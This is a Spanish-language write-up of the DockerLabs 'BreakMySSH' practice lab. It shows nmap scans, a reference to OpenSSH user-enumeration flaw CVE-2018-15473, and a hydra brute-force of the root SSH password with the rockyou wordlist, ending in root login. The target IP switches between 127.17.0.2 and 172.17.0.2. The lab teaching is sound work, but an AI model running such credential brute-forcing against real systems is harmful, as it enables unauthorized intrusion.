---
title: BreakMySSH
description: DockerLabs es una plataforma gratuita diseñada para practicar hacking ético al alcance de todo el mundo utilizando Docker. DockerLabs ofrece un entorno seguro y accesible para desplegar laboratorios vulnerables de la forma más eficiente y sencilla posible.
date: 2024-12-13
toc: true
pin: false
image:
 path: /assets/img/dockerlabs-writeup-breakmyssh/breakmyssh_logo.png
categories:
  - Docker_Labs
tags:
  - linux
  - dockerlabs
  - password_attacks
  - cve
  - ssh
  - tcp
  - information_gathering
  - privilege_escalation

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/dockerlabs/breakmyssh:-$ ping -c 1 127.17.0.2
PING 127.17.0.2 (127.17.0.2) 56(84) bytes of data.
64 bytes from 127.17.0.2: icmp_seq=1 ttl=64 time=0.044 ms

--- 127.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.044/0.044/0.044/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/dockerlabs/breakmyssh:-$ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG nmap1 127.17.0.2
Host: 127.17.0.2 ()	Status: Up
Host: 127.17.0.2 ()	Ports: 22/open/tcp//ssh///	Ignored State: closed (65534)
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/dockerlabs/breakmyssh:-$ sudo nmap -sCV -vvv -p22 -oN nmap2 127.17.0.2
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 1a:cb:5e:a3:3d:d1:da:c0:ed:2a:61:7f:73:79:46:ce (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfOr49bj2kh3ab2WutTu6Jx7NA7OKSxzp42bJU4nqtQlICZbjiBXhOa1ZKOfUfNvXOGEThiSrTNbf1nRGzXtACiZQp+RwQr5ZEYPAOyasC7C29FaIZVURR7FuFea+tfWZjbzDaP8WnA/U3TQHwtUBsNSR3qFscgJQ1niCyrfH/4rbUk5jiLYN6y8NjctGvsvwPE+cCiFVge76qyfzmZdaf5gJT9DKDt47iBkrngCODYrqqt+Bbl9ZEGh5SUfDqYfsFMIvlsSjmbx0HtMc2NhTW7jLtyV3Xm6ynFUZmQRPRqXdzuN5TIhYzaQD8ogC1Hk9sYJJNUMMF+lGVf15iouMn
|   256 54:9e:53:23:57:fc:60:1e:c0:41:cb:f3:85:32:01:fc (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLJ77V//dhC1BX2KXpMNurk9hJPA3aukuoMLPajtYfaewmlwrsK5Rdss/I/iQ23YrziNvWb3VMJk511YbvvreZo=
|   256 4b:15:7e:7b:b3:07:54:3d:74:ad:e0:94:78:0c:94:93 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICFLUqv+frul58FgQLXP91bNrTRC9d1X545DZJ0wsw6z
```

El único puerto abierto es el 22, y el servicio asociado es OpenSSH 7.7, el cual es vulnerable a enumeración de usuarios según CVE-2018-15473. Esta vulnerabilidad permite determinar si un usuario específico existe en el sistema.

<https://nvd.nist.gov/vuln/detail/cve-2018-15473>

```terminal
/home/kali/Documents/dockerlabs/breakmyssh:-$ searchsploit OpenSSH 7.7
```

![](/assets/img/dockerlabs-writeup-breakmyssh/breakmyssh1_1.png)

---
## Vulnerability Exploitation

Aunque la enumeración de usuarios es posible, puedo simplificar el ataque usando un usuario predeterminado, como root. Si la contraseña de este usuario se encuentra en una lista común, es viable realizar un ataque de fuerza bruta.

```terminal
/home/kali/Documents/dockerlabs/breakmyssh:-$ sudo hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10 -I
[22][ssh] host: 172.17.0.2   login: root   password: estrella
```

![](/assets/img/dockerlabs-writeup-breakmyssh/breakmyssh1_2.png)

```terminal
/home/kali/Documents/dockerlabs/breakmyssh:-$ ssh root@127.17.0.2
root@127.17.0.2's password: estrella
root@kali:~# id
uid=0(root) gid=0(root) groups=0(root)
```
